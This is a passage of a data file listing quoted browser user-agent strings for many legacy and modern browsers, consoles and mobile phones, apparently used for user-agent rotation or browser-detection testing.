  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
  "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
  "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
  "wii libnup/1.0",
  "Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
  "PSP (PlayStation Portable); 2.00",
  "Bunjalloo/0.7.6(Nintendo DS;U;en)",
  "Doris/1.15 [en] (Symbian)",
  "BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
  "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
  "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
  "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
  "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
  "MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
  "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
  "Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
  "MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
"Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5;",
"Mozilla/4.0 (compatible; Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729); Windows NT 5.1; Trident/4.0)",
"Mozilla/4.0 (compatible; Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727); Windows NT 5.1; Trident/4.0; Maxthon; .NET CLR 2.0.50727; .NET CLR 1.1.4322; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Acoo Browser; InfoPath.2; .NET CLR 2.0.50727; Alexa Toolbar)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Acoo Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; Windows NT 5.1; (R1 1.5); .NET CLR 2.0.50727; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; InfoPath.1; .NET CLR 2.0.50727; Media Center PC 3.0; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.2; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; HbTools 4.7.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; InfoPath.1; HbTools 4.8.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 3.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; .NET CLR 1.1.4322; HbTools 4.7.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 3.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; SV1)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; FunWebProducts; (R1 1.5); HbTools 4.7.7)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1; FunWebProducts)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows 98)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; InfoPath.1)",
"AmigaVoyager/3.2 (AmigaOS/MC680x0)",
"AmigaVoyager/2.95 (compatible; MC680x0; AmigaOS; SV1)",
"AmigaVoyager/2.95 (compatible; MC680x0; AmigaOS)",
"Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5004; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5001; Windows NT 5.1; Trident/4.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5000; Windows NT 5.1; Trident/4.0; FunWebProducts)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.5000; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.27; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.27; Windows NT 5.1; Trident/4.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.17; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.168; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.168; Windows NT 5.1; Trident/4.0; GTB7.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.130; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.130; Windows NT 5.1; Trident/4.0; FunWebProducts; GTB6.6; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; yie8)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.12; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.12; Windows NT 5.1; Trident/4.0; GTB6.3)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.124; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.122; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.122; Windows NT 5.1; Trident/4.0; FunWebProducts)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.111; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.110; Windows NT 5.1; Trident/4.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.6; AOLBuild 4340.104; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.6; AOLBuild 4340.128; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.5; AOLBuild 4337.43; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.5; AOLBuild 4337.29; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.21022; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.93; Windows NT 5.1; Trident/4.0; DigExt; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.89; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.81; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.81; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618) (Compatible; ; ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.81; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.80; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.53; Windows NT 6.0; FunWebProducts; GTB6; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.43; Windows NT 6.0; WOW64; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.43; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.43; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.42; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.40; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.40; Windows NT 6.0; FunWebProducts; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.40; Windows NT 5.1; Trident/4.0; GTB6; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.40; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.36; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30618; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.36; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.36; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.1; AOLBuild 4334.5012; Windows NT 6.0; WOW64; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.1; AOLBuild 4334.5011; Windows NT 6.1; WOW64; Trident/4.0; GTB7.2; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5010; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30729; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5009; Windows NT 5.1; GTB5; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; Trident/4.0; DigExt; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; GTB5; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5000; Windows NT 5.1; Trident/4.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.5000; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.36; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.34; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.34; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.34; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.34; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.27; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506; Media Center PC 5.0); UnAuth-State",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.27; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506); UnAuth-State",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4334.27; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; InfoPath.1); UnAuth-State",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.1; AOLBuild 4327.65535; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727); UnAuth-State",
"Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.1; AOLBuild 4334.5006; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.0; Windows NT 6.0; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.0; AOLBuild 4327.5201; Windows NT 6.0; WOW64; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.30729; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; InfoPath.2; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Trident/4.0; FunWebProducts; GTB6.4; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 1.1.4322; .NET CLR 3.5.30729; OfficeLiveConnector.1.3; OfficeLivePatch.0.0; .NET CLR 3.0.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; Seekmo 10.0.406.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; FunWebProducts; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; InfoPath.2; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; FunWebProducts; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; Seekmo 10.0.341.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 6.0; FunWebProducts; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; Trident/4.0; GTB6; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; .NET CLR 1.1.4322; .NET CLR 2.0.50727; OfficeLiveConnector.1.3; OfficeLivePatch.0.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; GTB5; .NET CLR 1.0.3705; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; FunWebProducts; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) )",
